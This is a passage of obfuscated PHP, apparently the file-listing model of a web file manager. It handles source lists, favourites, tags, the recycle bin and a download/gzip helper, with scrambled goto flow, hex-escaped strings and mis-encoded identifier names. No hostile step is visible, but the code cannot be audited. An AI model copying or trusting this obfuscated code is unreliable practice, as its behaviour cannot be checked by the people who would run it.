filesize($e®∂©ìÉ¡∂) != 0) { self::checkGzip($e®∂©ìÉ¡∂); if (!@rename($e®∂©ìÉ¡∂, $F†≠Ã”È›ı)) { @unlink($F†≠Ã”È›ı); $dïö∞áÓ‹í = @rename($e®∂©ìÉ¡∂, $F†≠Ã”È›ı); if (!$dïö∞áÓ‹í) { return array($e”∞Ωô∫æÔ[1036] => !1, $e”∞Ωô∫æÔ[1038] => $e”∞Ωô∫æÔ[1530]); } } return array($e”∞Ωô∫æÔ[1036] => !0, $e”∞Ωô∫æÔ[1038] => $e”∞Ωô∫æÔ[696]); } return array($e”∞Ωô∫æÔ[1036] => !1, $e”∞Ωô∫æÔ[1038] => $e”∞Ωô∫æÔ[1531]); goto DÈô œ”ëò; bæ≤Ô˘¡Ùø: $d˜çÚ´⁄…≠ = @fopen($e®∂©ìÉ¡∂, $e”∞Ωô∫æÔ[984]); if (!$d˜çÚ´⁄…≠) { return array($e”∞Ωô∫æÔ[1036] => !1, $e”∞Ωô∫æÔ[1038] => $e”∞Ωô∫æÔ[1528]); } $Cà≤≈á“ÆÏ = curl_init($D¶≥ùü¬·◊); goto f…áöÙÑıö; DÈô œ”ëò: } static function checkGzip($FËåõëñâ) { goto aôñ∫Ôêçå; dƒŸæºÕÉ„: file_put_contents($FËåõëñâ, $Bö©ÓˆêÕﬁ); goto dÉÙùË¯§Ã; aôñ∫Ôêçå: $Büêﬂ§ë‘“ = $_SERVER[Ä¿¡‡öóµŸﬂ‡][1532]; $c°£æ ñª‰ = file_sub_str($FËåõëñâ, 0, 2); if ($Büêﬂ§ë‘“ != $c°£æ ñª‰) { return; } goto E¡îæ—´∂Á; E¡îæ—´∂Á: ob_start(); readgzfile($FËåõëñâ); $Bö©ÓˆêÕﬁ = ob_get_clean(); goto dƒŸæºÕÉ„; dÉÙùË¯§Ã: } } goto d“√êÇŸ¶Œ; Aü‡ƒ»º‘√: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\x75\162\x63\145"; protected $tableMeta = array("\164\x61\x62\x6c\x65\x4e\x61\x6d\x65" => "\151\157\x5f\163\157\x75\162\x63\145\137\x6d\x65\x74\141", "\x6d\145\x74\141\x46\151\145\x6c\x64" => "\x73\157\165\162\143\x65\111\104"); protected $dataAuto = array(array("\155\x6f\144\x69\146\x79\124\x69\x6d\x65", "\164\151\155\145", "\151\x6e\x73\145\x72\x74", "\x66\x75\156\143\164\x69\x6f\156"), array("\x63\162\145\x61\x74\145\x54\151\x6d\x65", "\164\151\x6d\145", "\x69\156\163\x65\x72\x74", "\146\x75\156\x63\x74\x69\157\x6e"), array("\x76\x69\x65\x77\124\151\x6d\145", "\x74\x69\155\x65", "\x69\x6e\163\145\162\x74", "\x66\x75\x6e\143\164\x69\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($bÜ¬òóÔ˘®) { return $this->listSource(array($_SERVER[Ä¿¡‡öóµŸﬂ‡][368] => $bÜ¬òóÔ˘®)); } public function typeName($eÉˆ∆ó¿åø) { static $C°ı≠‡ïÒâ = array(self::TYPE_SYSTEM => "\x73\x79\163\164\x65\x6d", self::TYPE_USER => "\165\x73\x65\x72", self::TYPE_GROUP => "\147\x72\x6f\x75\x70"); return $C°ı≠‡ïÒâ[$eÉˆ∆ó¿åø . $_SERVER[Ä¿¡‡öóµŸﬂ‡][33]]; } public function sourceListInfo($Cπ¯§Ö∂Óù, $f‡É ¶ıó‡ = false) { goto D⁄’≈æÃÌ¢; D⁄’≈æÃÌ¢: $få‰É≥‚≠∫ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Cπ¯§Ö∂Óù = $Cπ¯§Ö∂Óù ? $Cπ¯§Ö∂Óù : array(); $Cπ¯§Ö∂Óù = array_filter(array_unique($Cπ¯§Ö∂Óù)); goto Eö‚–÷ì™≠; Eö‚–÷ì™≠: if (!$Cπ¯§Ö∂Óù) { return array(); } $eÚﬁíçâ√õ = $this->where(array($få‰É≥‚≠∫[369] => array($få‰É≥‚≠∫[7], $Cπ¯§Ö∂Óù)))->select(); $this->_listDataApply($eÚﬁíçâ√õ, $f‡É ¶ıó‡); goto båÒâÍ€…Û; båÒâÍ€…Û: return array_to_keyvalue($eÚﬁíçâ√õ, $få‰É≥‚≠∫[369]); goto f„¨Øêú∆›; f„¨Øêú∆›: } public function pathInfoFilter($eåÀãâü⁄É) { goto F’ÜÂè∂¯Ç; aÍå≥Îµç≥: $BßˆÖè∞∏º .= $AéàÆêï≥Æ[374]; $BßˆÖè∞∏º .= $AéàÆêï≥Æ[375]; $cáµ˘ÂùÜª = explode($AéàÆêï≥Æ[47], $BßˆÖè∞∏º); goto eÙù„ºÔÊ€; e—ë´äÏ§ƒ: $eåÀãâü⁄É[$AéàÆêï≥Æ[371]] = $this->typeName($eåÀãâü⁄É[$AéàÆêï≥Æ[371]]); if ($eåÀãâü⁄É[$AéàÆêï≥Æ[370]] != 1) { $eåÀãâü⁄É[$AéàÆêï≥Æ[160]] = $eåÀãâü⁄É[$AéàÆêï≥Æ[372]]; unset($eåÀãâü⁄É[$AéàÆêï≥Æ[372]]); } $BßˆÖè∞∏º = $AéàÆêï≥Æ[373]; goto aÍå≥Îµç≥; eÙù„ºÔÊ€: if (isset($eåÀãâü⁄É[$AéàÆêï≥Æ[376]]) && $eåÀãâü⁄É[$AéàÆêï≥Æ[376]][$AéàÆêï≥Æ[377]] == -1) { $cáµ˘ÂùÜª = array_remove_value($cáµ˘ÂùÜª, $AéàÆêï≥Æ[187]); $cáµ˘ÂùÜª = array_remove_value($cáµ˘ÂùÜª, $AéàÆêï≥Æ[107]); $cáµ˘ÂùÜª = array_remove_value($cáµ˘ÂùÜª, $AéàÆêï≥Æ[378]); $cáµ˘ÂùÜª = array_remove_value($cáµ˘ÂùÜª, $AéàÆêï≥Æ[379]); $cáµ˘ÂùÜª = array_remove_value($cáµ˘ÂùÜª, $AéàÆêï≥Æ[77]); $cáµ˘ÂùÜª = array_remove_value($cáµ˘ÂùÜª, $AéàÆêï≥Æ[380]); } $eåÀãâü⁄É = array_field_key($eåÀãâü⁄É, $cáµ˘ÂùÜª); return $eåÀãâü⁄É; goto DÂèúêÀÿ÷; F’ÜÂè∂¯Ç: $AéàÆêï≥Æ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $eåÀãâü⁄É[$AéàÆêï≥Æ[75]] = KodIO::make($eåÀãâü⁄É[$AéàÆêï≥Æ[369]]); $eåÀãâü⁄É[$AéàÆêï≥Æ[29]] = $eåÀãâü⁄É[$AéàÆêï≥Æ[370]] == 1 ? $AéàÆêï≥Æ[76] : $AéàÆêï≥Æ[167]; goto e—ë´äÏ§ƒ; DÂèúêÀÿ÷: } public function listUserFav() { goto f™ÌÊîà‡ı; eÕîïî¬ÍΩ: foreach ($e¨¥≠™çòŸ as &$fˆÇüÜ†ıî) { $fˆÇüÜ†ıî = array($Fèãâ‰ÍΩı[385] => $fˆÇüÜ†ıî[$Fèãâ‰ÍΩı[367]], $Fèãâ‰ÍΩı[386] => $fˆÇüÜ†ıî[$Fèãâ‰ÍΩı[28]], $Fèãâ‰ÍΩı[387] => $fˆÇüÜ†ıî[$Fèãâ‰ÍΩı[75]], $Fèãâ‰ÍΩı[388] => $fˆÇüÜ†ıî[$Fèãâ‰ÍΩı[29]], $Fèãâ‰ÍΩı[389] => $fˆÇüÜ†ıî[$Fèãâ‰ÍΩı[187]], $Fèãâ‰ÍΩı[390] => $fˆÇüÜ†ıî[$Fèãâ‰ÍΩı[107]]); if ($fˆÇüÜ†ıî[$Fèãâ‰ÍΩı[29]] == $Fèãâ‰ÍΩı[382] && $E¨∫±ÀÆµ⁄[$fˆÇüÜ†ıî[$Fèãâ‰ÍΩı[75]]]) { $fˆÇüÜ†ıî[$Fèãâ‰ÍΩı[391]] = $E¨∫±ÀÆµ⁄[$fˆÇüÜ†ıî[$Fèãâ‰ÍΩı[75]]]; } } return $e¨¥≠™çòŸ; goto Aïáñø ÁÍ; dÒÍ∆§Ñ∏Ø: $Fí√±Î›Ôª = array_to_keyvalue($Fí√±Î›Ôª, $Fèãâ‰ÍΩı[33], $Fèãâ‰ÍΩı[75]); if ($Fí√±Î›Ôª) { $E¨∫±ÀÆµ⁄ = $this->listSource(array($Fèãâ‰ÍΩı[383] => array($Fèãâ‰ÍΩı[384], $Fí√±Î›Ôª))); } $E¨∫±ÀÆµ⁄ = array_to_keyvalue($E¨∫±ÀÆµ⁄[$Fèãâ‰ÍΩı[354]], $Fèãâ‰ÍΩı[369]); goto eÕîïî¬ÍΩ; f™ÌÊîà‡ı: $Fèãâ‰ÍΩı =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $e¨¥≠™çòŸ = Model($Fèãâ‰ÍΩı[381])->listData(); $Fí√±Î›Ôª = array_filter_by_field($e¨¥≠™çòŸ, $Fèãâ‰ÍΩı[29], $Fèãâ‰ÍΩı[382]); goto dÒÍ∆§Ñ∏Ø; Aïáñø ÁÍ: } public function listUserTag($dÀÜ©ùúä∏) { goto F¯µÓ¡‹øÑ; D∆ÈÊ—ı´Â: $Aï´ÒÆˆ…È = array_to_keyvalue($Aï´ÒÆˆ…È, $BûŸ Œÿ©í[33], $BûŸ Œÿ©í[75]); $a∂éÜ¬Á€∏ = array(); if ($Aï´ÒÆˆ…È) { $e≥Ò¨’£îó = array($BûŸ Œÿ©í[383] => array($BûŸ Œÿ©í[384], $Aï´ÒÆˆ…È)); $a∂éÜ¬Á€∏ = $this->listSource($e≥Ò¨’£îó); } goto cÜ«Ö‹âÍè; F¯µÓ¡‹øÑ: $BûŸ Œÿ©í =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $b«’´ôäﬂÆ = Model($BûŸ Œÿ©í[392])->listData(); $Aï´ÒÆˆ…È = array_filter_by_field($b«’´ôäﬂÆ, $BûŸ Œÿ©í[393], $dÀÜ©ùúä∏); goto D∆ÈÊ—ı´Â; cÜ«Ö‹âÍè: $this->listUserTagClear($Aï´ÒÆˆ…È, $a∂éÜ¬Á€∏, $dÀÜ©ùúä∏); return $a∂éÜ¬Á€∏; goto F§ËŒÖ∫≥á; F§ËŒÖ∫≥á: } private function listUserTagClear($D¬≤ôæÚã©, $aë›Óåïßé, $fπì’Üªµ®) { goto Eˆàµüõ≥˜; Eˆàµüõ≥˜: $dû€Ìõÿ¯ÿ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$D¬≤ôæÚã©) { return; } if ($aë›Óåïßé && count($D¬≤ôæÚã©) == $aë›Óåïßé[$dû€Ìõÿ¯ÿ[351]][$dû€Ìõÿ¯ÿ[352]]) { return; } goto fëà£ ˘ÍÊ; A‰ﬁÑÇíÚª: Model($dû€Ìõÿ¯ÿ[394])->removeFromTag($C£ÒÑïˆêµ, $fπì’Üªµ®); goto dßÜ±ñ…Ë≤; fëà£ ˘ÍÊ: $C£ÒÑïˆêµ = array(); $bﬂﬁûñı¡ = array_to_keyvalue($aë›Óåïßé[$dû€Ìõÿ¯ÿ[74]], $dû€Ìõÿ¯ÿ[33], $dû€Ìõÿ¯ÿ[369]); $B’ø•ôÓÜÃ = array_to_keyvalue($aë›Óåïßé[$dû€Ìõÿ¯ÿ[73]], $dû€Ìõÿ¯ÿ[33], $dû€Ìõÿ¯ÿ[369]); goto dö◊÷œ‰∏; dö◊÷œ‰∏: $cÑèê©ãı÷ = array_merge($B’ø•ôÓÜÃ, $bﬂﬁûñı¡); foreach ($D¬≤ôæÚã© as $AŸ»∑ÂÍîû) { if (!in_array($AŸ»∑ÂÍîû, $cÑèê©ãı÷)) { $C£ÒÑïˆêµ[] = $AŸ»∑ÂÍîû; } } if (!$C£ÒÑïˆêµ) { return; } goto A‰ﬁÑÇíÚª; dßÜ±ñ…Ë≤: } public function listUserRecycle() { $eèÆÖ◊ßËù =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $A£Ú÷ﬂïºÃ = Model($eèÆÖ◊ßËù[395])->listData(); if (!$A£Ú÷ﬂïºÃ) { return array(); } $cÁø‚ˆÇùÌ = array($eèÆÖ◊ßËù[383] => array($eèÆÖ◊ßËù[384], $A£Ú÷ﬂïºÃ), $eèÆÖ◊ßËù[396] => 1); return $this->listSource($cÁø‚ˆÇùÌ); } public function listSource($DéﬂëŸ‡…Ö, $bÖ‚Öê£…† = 3000) { goto EîÆ∏ôÂÿ‹; EîÆ∏ôÂÿ‹: $A‘¥Ïˆ¨á» =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!isset($DéﬂëŸ‡…Ö[$A‘¥Ïˆ¨á»[397]])) { $DéﬂëŸ‡…Ö[$A‘¥Ïˆ¨á»[397]] = 0; } $cäè∂ü„µ¯ = $A‘¥Ïˆ¨á»[398]; goto f¬ô±ª…√Ù; f¬ô±ª…√Ù: $DõëÑ≠ñÏ≠ = $this->field($cäè∂ü„µ¯)->_makeOrder()->where($DéﬂëŸ‡…Ö)->selectPage($bÖ‚Öê£…†); $this->_listDataApply($DõëÑ≠ñÏ≠[$A‘¥Ïˆ¨á»[354]]); $this->_listMake($DõëÑ≠ñÏ≠); goto AÛñäõ‘Ëà; AÛñäõ‘Ëà: return $DõëÑ≠ñÏ≠; goto C≤‡àöŸ°Ü; C≤‡àöŸ°Ü: } protected function _makeOrder() { goto F‡ﬁÈ¨ö±≤; Cê”¢¡˘∆Ü: if ($fÓ±±á‹íÜ == $F„öƒë¢åå[28]) { } $D„ÖÑÁπõç = $F„öƒë¢åå[409] . $B˜Øë¶∂∞Ç[$fÓ±±á‹íÜ] . $F„öƒë¢åå[50] . $déºŸ¬Î†—[$EíßΩ∫≈äÃ]; return $this->order(rtrim(trim($D„ÖÑÁπõç), $F„öƒë¢åå[47])); goto F»Ω’ª•ø; aéÊÑﬂÊÁ‰: $EíßΩ∫≈äÃ = Input::get($F„öƒë¢åå[408], $F„öƒë¢åå[7], $c„Ü≠ºëﬁ◊, array_keys($déºŸ¬Î†—)); if (!in_array($fÓ±±á‹íÜ, array_keys($B˜Øë¶∂∞Ç))) { $fÓ±±á‹íÜ = $F„öƒë¢åå[28]; } if (!in_array($EíßΩ∫≈äÃ, array_keys($déºŸ¬Î†—))) { $fÓ±±á‹íÜ = $F„öƒë¢åå[402]; } goto Cê”¢¡˘∆Ü; F‡ﬁÈ¨ö±≤: $F„öƒë¢åå =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $e§˜Ã Æ±å = Model($F„öƒë¢åå[399])->get($F„öƒë¢åå[400]); $c„Ü≠ºëﬁ◊ = Model($F„öƒë¢åå[399])->get($F„öƒë¢åå[401]); goto B≈«å¯¨¨—; B≈«å¯¨¨—: $déºŸ¬Î†— = array($F„öƒë¢åå[402] => $F„öƒë¢åå[403], $F„öƒë¢åå[404] => $F„öƒë¢åå[405]); $B˜Øë¶∂∞Ç = array($F„öƒë¢åå[28] => $F„öƒë¢åå[28], $F„öƒë¢åå[77] => $F„öƒë¢åå[77], $F„öƒë¢åå[160] => $F„öƒë¢åå[372], $F„öƒë¢åå[378] => $F„öƒë¢åå[378], $F„öƒë¢åå[406] => $F„öƒë¢åå[379], $F„öƒë¢åå[187] => $F„öƒë¢åå[187], $F„öƒë¢åå[107] => $F„öƒë¢åå[107]); $fÓ±±á‹íÜ = Input::get($F„öƒë¢åå[407], $F„öƒë¢åå[7], $e§˜Ã Æ±å, array_keys($B˜Øë¶∂∞Ç)); goto aéÊÑﬂÊÁ‰; F»Ω’ª•ø: } protected function _listDataApplyItem($FÎﬂı»ëÌñ, $B˜≤à–∫‡à = false) { $dπÍèëπ¨“ = array($FÎﬂı»ëÌñ); $this->_listDataApply($dπÍèëπ¨“, $B˜≤à–∫‡à); return $dπÍèëπ¨“[0]; } protected function _listDataApply(&$F£ÎÍ∂ˆÇë, $Dì∞¶ô÷±à = false) { goto Eﬂêì‚ñã…; BçÑÆü»òﬂ: $this->_listAppendPath($F£ÎÍ∂ˆÇë); $this->_listAppendAuth($F£ÎÍ∂ˆÇë); $this->_listAppendSourceInfo($F£ÎÍ∂ˆÇë, $F⁄ô”…©¿Ó); goto B®òª‰ä¿ﬁ; Eﬂêì‚ñã…: $DëÂ»œáÓæ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$F£ÎÍ∂ˆÇë) { $F£ÎÍ∂ˆÇë = array(); return; } $F⁄ô”…©¿Ó = array_to_keyvalue($F£ÎÍ∂ˆÇë, $DëÂ»œáÓæ[33], $DëÂ»œáÓæ[369]); goto bâ¨öÔéπÆ; B®òª‰ä¿ﬁ: $this->_listAppendUser($F£ÎÍ∂ˆÇë); $this->_listFilterInfo($F£ÎÍ∂ˆÇë, $Dì∞¶ô÷±à); goto Aü›èÑ˜„ñ; bâ¨öÔéπÆ: $F⁄ô”…©¿Ó = array_unique($F⁄ô”…©¿Ó); $this->_listSourceCache($F£ÎÍ∂ˆÇë); if (!$Dì∞¶ô÷±à) { $this->_listAppendMeta($F£ÎÍ∂ˆÇë, $F⁄ô”…©¿Ó); $this->_listAppendFileMeta($F£ÎÍ∂ˆÇë, $F⁄ô”…©¿Ó); $this->_listAppendChildren($F£ÎÍ∂ˆÇë, $F⁄ô”…©¿Ó); } goto BçÑÆü»òﬂ; Aü›èÑ˜„ñ: } protected function _listSourceCache($fâ◊∫¯ƒ€ﬁ) { $CóÇª£ÛÔË =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; foreach ($fâ◊∫¯ƒ€ﬁ as $E£∫Îº◊Çá) { self::$cacheSourceInfo[$CóÇª£ÛÔË[410] . $E£∫Îº◊Çá[$CóÇª£ÛÔË[369]]] = $E£∫Îº◊Çá; } } protected function _listFilterInfo(&$FÍ◊ß‹Ôñ«, $DË≤π◊áëœ = false) { $cê¬≤·Ô®æ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; foreach ($FÍ◊ß‹Ôñ« as &$CŸÑûà…ìÏ) { $CŸÑûà…ìÏ = $this->pathInfoFilter($CŸÑûà…ìÏ); self::$cachePathInfo[$cê¬≤·Ô®æ[411] . intval($DË≤π◊áëœ) . $cê¬≤·Ô®æ[412] . $CŸÑûà…ìÏ[$cê¬≤·Ô®æ[369]]] = $CŸÑûà…ìÏ; } } protected function _listMake(&$EÔóÑÉÓÕ‚) { $Fâ⁄èéàí· =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $EÔóÑÉÓÕ‚[$Fâ⁄èéàí·[74]] = array(); $EÔóÑÉÓÕ‚[$Fâ⁄èéàí·[73]] = array(); foreach ($EÔóÑÉÓÕ‚[$Fâ⁄èéàí·[354]] as $d∑Ãı“…Ÿû) { $b⁄≤ê⁄ØõÖ = $d∑Ãı“…Ÿû[$Fâ⁄èéàí·[370]] == 1 ? $Fâ⁄èéàí·[74] : $Fâ⁄èéàí·[73]; $EÔóÑÉÓÕ‚[$b⁄≤ê⁄ØõÖ][] = $d∑Ãı“…Ÿû; } unset($EÔóÑÉÓÕ‚[$Fâ⁄èéàí·[354]]); } protected function _listAppendMeta(&$AÉâ£»ÎßÇ, $CÛ¢ºŸﬁõ‹) { goto a‰Òø‹¬®•; a‰Òø‹¬®•: $e≠Ú€îÁëÆ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $f»òÓã€Ú™ = array($e≠Ú€îÁëÆ[383] => array($e≠Ú€îÁëÆ[384], $CÛ¢ºŸﬁõ‹)); $AßåÖ‹ÜöŒ = Model($e≠Ú€îÁëÆ[413])->field($e≠Ú€îÁëÆ[414])->where($f»òÓã€Ú™)->select(); goto aÁ∫¯ß°ºø; aÁ∫¯ß°ºø: if (!$AßåÖ‹ÜöŒ) { return; } $a˜Ñﬁƒø‘¢ = array($e≠Ú€îÁëÆ[415], $e≠Ú€îÁëÆ[416]); $Eï‹∫‹éÆŸ = array(); goto Aıº—Õœ‘Ü; Aıº—Õœ‘Ü: foreach ($AßåÖ‹ÜöŒ as $dÉ≥Éï¥à≠) { if (!isset($Eï‹∫‹éÆŸ[$dÉ≥Éï¥à≠[$e≠Ú€îÁëÆ[369]]])) { $Eï‹∫‹éÆŸ[$dÉ≥Éï¥à≠[$e≠Ú€îÁëÆ[369]]] = array(); } if (in_array($dÉ≥Éï¥à≠[$e≠Ú€îÁëÆ[89]], $a˜Ñﬁƒø‘¢)) { continue; } $Eï‹∫‹éÆŸ[$dÉ≥Éï¥à≠[$e≠Ú€îÁëÆ[369]]][$dÉ≥Éï¥à≠[$e≠Ú€îÁëÆ[89]]] = $dÉ≥Éï¥à≠[$e≠Ú€îÁëÆ[359]]; } foreach ($AÉâ£»ÎßÇ as &$E´÷ç∑ı“π) { $E´÷ç∑ı“π[$e≠Ú€îÁëÆ[417]] = !1; if (isset($Eï‹∫‹éÆŸ[$E´÷ç∑ı“π[$e≠Ú€îÁëÆ[369]]])) { $E´÷ç∑ı“π[$e≠Ú€îÁëÆ[417]] = $Eï‹∫‹éÆŸ[$E´÷ç∑ı“π[$e≠Ú€îÁëÆ[369]]]; } if ($this->fileIsLock($E´÷ç∑ı“π) && $E´÷ç∑ı“π[$e≠Ú€îÁëÆ[376]]) { $f¡‰î“Îÿƒ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $E´÷ç∑ı“π[$e≠Ú€îÁëÆ[376]][$e≠Ú€îÁëÆ[377]] = AuthModel::authDisable($E´÷ç∑ı“π[$e≠Ú€îÁëÆ[376]][$e≠Ú€îÁëÆ[377]], $f¡‰î“Îÿƒ); $E´÷ç∑ı“π[$e≠Ú€îÁëÆ[376]][$e≠Ú€îÁëÆ[418]][$e≠Ú€îÁëÆ[376]] = $E´÷ç∑ı“π[$e≠Ú€îÁëÆ[376]][$e≠Ú€îÁëÆ[377]]; } } goto e“ËÈ§ÚøÕ; e“ËÈ§ÚøÕ: } protected function _listAppendFileMeta(&$Aõ›¢¬ã≠Í, $EéïàêõÓ) { goto f®£∆ƒÂú˜; eöÀ¨î∫Ñ : foreach ($Aõ›¢¬ã≠Í as &$bËá∏ØƒÇä) { goto d´ÜıÍÑ≤ö; f≈è≥•ì†à: if (isset($bËá∏ØƒÇä[$fü≈ÆìƒßÛ[162]][$fü≈ÆìƒßÛ[426]])) { $bËá∏ØƒÇä[$fü≈ÆìƒßÛ[426]] = json_decode($bËá∏ØƒÇä[$fü≈ÆìƒßÛ[162]][$fü≈ÆìƒßÛ[426]], !0); unset($bËá∏ØƒÇä[$fü≈ÆìƒßÛ[162]][$fü≈ÆìƒßÛ[426]]); } goto Eê©¨Î‘ã≥; f˘À∫‡›πΩ: unset($B‰•≈à‚ƒü[$D”¯ï⁄À°ô][$fü≈ÆìƒßÛ[75]]); $EÔøìº⁄ËÖ = is_array($BªÙ´ìÕòﬁ[$D”¯ï⁄À°ô]) ? $BªÙ´ìÕòﬁ[$D”¯ï⁄À°ô] : array(); $bËá∏ØƒÇä[$fü≈ÆìƒßÛ[162]] = array_merge($EÔøìº⁄ËÖ, $B‰•≈à‚ƒü[$D”¯ï⁄À°ô]); goto f≈è≥•ì†à; d´ÜıÍÑ≤ö: $D”¯ï⁄À°ô = $bËá∏ØƒÇä[$fü≈ÆìƒßÛ[419]]; if (!$D”¯ï⁄À°ô || !isset($B‰•≈à‚ƒü[$D”¯ï⁄À°ô])) { continue; } $cÚÆ¯Û›ìı = $B‰•≈à‚ƒü[$D”¯ï⁄À°ô]; goto EŒÔ◊óê‘≠; EŒÔ◊óê‘≠: $cÚÆ¯Û›ìı[$fü≈ÆìƒßÛ[77]] = $bËá∏ØƒÇä[$fü≈ÆìƒßÛ[77]]; $cÚÆ¯Û›ìı[$fü≈ÆìƒßÛ[28]] = $bËá∏ØƒÇä[$fü≈ÆìƒßÛ[28]]; self::$cacheFileInfo[$fü≈ÆìƒßÛ[425] . $D”¯ï⁄À°ô] = $cÚÆ¯Û›ìı; goto f˘À∫‡›πΩ; Eê©¨Î‘ã≥: } goto dÛ†ÃÿñÓﬁ; f®£∆ƒÂú˜: $fü≈ÆìƒßÛ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $F”„†ŸÊ• = array_to_keyvalue($Aõ›¢¬ã≠Í, $fü≈ÆìƒßÛ[33], $fü≈ÆìƒßÛ[419]); $F”„†ŸÊ• = array_filter(array_unique($F”„†ŸÊ•)); goto e˜à°®é±÷; dâ‰»Ñ˜ÓË: $Bæà“èøõâ = $Bæà“èøõâ ? $Bæà“èøõâ : array(); $BªÙ´ìÕòﬁ = array(); foreach ($Bæà“èøõâ as $e∞ú«π“‚) { if (!isset($BªÙ´ìÕòﬁ[$e∞ú«π“‚[$fü≈ÆìƒßÛ[419]]])) { $BªÙ´ìÕòﬁ[$e∞ú«π“‚[$fü≈ÆìƒßÛ[419]]] = array(); } $BªÙ´ìÕòﬁ[$e∞ú«π“‚[$fü≈ÆìƒßÛ[419]]][$e∞ú«π“‚[$fü≈ÆìƒßÛ[89]]] = $e∞ú«π“‚[$fü≈ÆìƒßÛ[359]]; } goto eöÀ¨î∫Ñ ; e˜à°®é±÷: if (!$F”„†ŸÊ•) { return; } $AÜß‚ÿÉù¨ = array($fü≈ÆìƒßÛ[420] => array($fü≈ÆìƒßÛ[384], $F”„†ŸÊ•)); $eóîº’˜íË = $fü≈ÆìƒßÛ[421]; goto f∂´ë÷Ã»⁄; f∂´ë÷Ã»⁄: $B‰•≈à‚ƒü = Model($fü≈ÆìƒßÛ[422])->field($eóîº’˜íË)->where($AÜß‚ÿÉù¨)->select(); $B‰•≈à‚ƒü = array_to_keyvalue($B‰•≈à‚ƒü, $fü≈ÆìƒßÛ[419]); $Bæà“èøõâ = Model($fü≈ÆìƒßÛ[423])->field($fü≈ÆìƒßÛ[424])->where($AÜß‚ÿÉù¨)->select(); goto dâ‰»Ñ˜ÓË; dÛ†ÃÿñÓﬁ: } protected function _listAppendSourceInfo(&$B¨°Ó¯ÒêÌ, $D™ÏèƒÈöª) { goto B¿∆Œ∏Íêô; BÊ¥§∫‘›Ø: $f€éÖ¢≈Ú¨ = array_to_keyvalue_group($D∞í•ÒÌŸ¿, $cã…Ô”ìÓÓ[369]); foreach ($B¨°Ó¯ÒêÌ as &$E–é¢„´¶¥) { $E–é¢„´¶¥[$cã…Ô”ìÓÓ[391]] = array($cã…Ô”ìÓÓ[430] => 0, $cã…Ô”ìÓÓ[431] => 0, $cã…Ô”ìÓÓ[432] => 0); if (isset($E∞çÌ¡∆ºÂ[$E–é¢„´¶¥[$cã…Ô”ìÓÓ[369]]])) { $E–é¢„´¶¥[$cã…Ô”ìÓÓ[391]][$cã…Ô”ìÓÓ[433]] = 1; $E–é¢„´¶¥[$cã…Ô”ìÓÓ[391]][$cã…Ô”ìÓÓ[434]] = $E∞çÌ¡∆ºÂ[$E–é¢„´¶¥[$cã…Ô”ìÓÓ[369]]][$cã…Ô”ìÓÓ[28]]; } if (isset($f—Ö¯ Øù„[$E–é¢„´¶¥[$cã…Ô”ìÓÓ[369]]])) { $E–é¢„´¶¥[$cã…Ô”ìÓÓ[391]][$cã…Ô”ìÓÓ[435]] = array(); foreach ($f—Ö¯ Øù„[$E–é¢„´¶¥[$cã…Ô”ìÓÓ[369]]] as $d¿Íπ∞’„ê) { $F®‰˜•‚› = $bÑÉ’Íîÿ›[$d¿Íπ∞’„ê]; $E–é¢„´¶¥[$cã…Ô”ìÓÓ[391]][$cã…Ô”ìÓÓ[435]][] = array($cã…Ô”ìÓÓ[436] => $F®‰˜•‚›[$cã…Ô”ìÓÓ[367]], $cã…Ô”ìÓÓ[386] => $F®‰˜•‚›[$cã…Ô”ìÓÓ[28]], $cã…Ô”ìÓÓ[437] => $F®‰˜•‚›[$cã…Ô”ìÓÓ[438]]); } } if (isset($f€éÖ¢≈Ú¨[$E–é¢„´¶¥[$cã…Ô”ìÓÓ[369]]])) { $E–é¢„´¶¥[$cã…Ô”ìÓÓ[391]][$cã…Ô”ìÓÓ[439]] = array(); foreach ($f€éÖ¢≈Ú¨[$E–é¢„´¶¥[$cã…Ô”ìÓÓ[369]]] as $BÒ›˘œç¢†) { $E–é¢„´¶¥[$cã…Ô”ìÓÓ[391]][$cã…Ô”ìÓÓ[439]] = array($cã…Ô”ìÓÓ[440] => $BÒ›˘œç¢†[$cã…Ô”ìÓÓ[441]], $cã…Ô”ìÓÓ[442] => $BÒ›˘œç¢†[$cã…Ô”ìÓÓ[443]], $cã…Ô”ìÓÓ[444] => $BÒ›˘œç¢†[$cã…Ô”ìÓÓ[369]], $cã…Ô”ìÓÓ[445] => $BÒ›˘œç¢†[$cã…Ô”ìÓÓ[446]], $cã…Ô”ìÓÓ[447] => $BÒ›˘œç¢†[$cã…Ô”ìÓÓ[448]]); } } } return $B¨°Ó¯ÒêÌ; goto dπﬂÃØïçÓ; DπÂ¶≠Áñ…: $bÑÉ’Íîÿ› = array_to_keyvalue($FËèˆ–ã‚≈, $cã…Ô”ìÓÓ[367]); $f—Ö¯ Øù„ = array_to_keyvalue_group($aåÑË≈º¯®, $cã…Ô”ìÓÓ[75], $cã…Ô”ìÓÓ[393]); $E∞çÌ¡∆ºÂ = array_to_keyvalue($AﬁÜé¿êÑ™, $cã…Ô”ìÓÓ[75]); goto BÊ¥§∫‘›Ø; D™˘’≈œâç: $aåÑË≈º¯® = Model($cã…Ô”ìÓÓ[392])->listData(); $AﬁÜé¿êÑ™ = Model($cã…Ô”ìÓÓ[381])->listData(); $D∞í•ÒÌŸ¿ = Model($cã…Ô”ìÓÓ[429])->listSimple(); goto DπÂ¶≠Áñ…; B¿∆Œ∏Íêô: $cã…Ô”ìÓÓ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if 